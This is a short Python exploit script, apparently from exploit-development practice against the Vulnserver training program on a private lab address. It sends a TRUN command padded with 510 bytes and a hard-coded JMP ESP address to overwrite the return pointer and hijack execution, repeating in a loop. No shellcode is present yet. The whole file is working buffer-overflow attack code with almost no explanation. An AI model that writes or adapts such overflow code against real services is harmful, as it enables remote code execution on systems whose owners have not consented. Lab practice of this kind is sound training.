#!/usr/bin/python3
import sys
import socket
from time import sleep

# our JMP ESP address is at  0x625011af

buffer = b"A" * 510 + b"\xaf\x11\x50\x62"

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('10.0.2.7', 9999))
        payload = b'TRUN /.:/' + buffer
        sock.send(payload)
        sock.close()
    except:
        print("Error connecting to the server")
        sys.exit()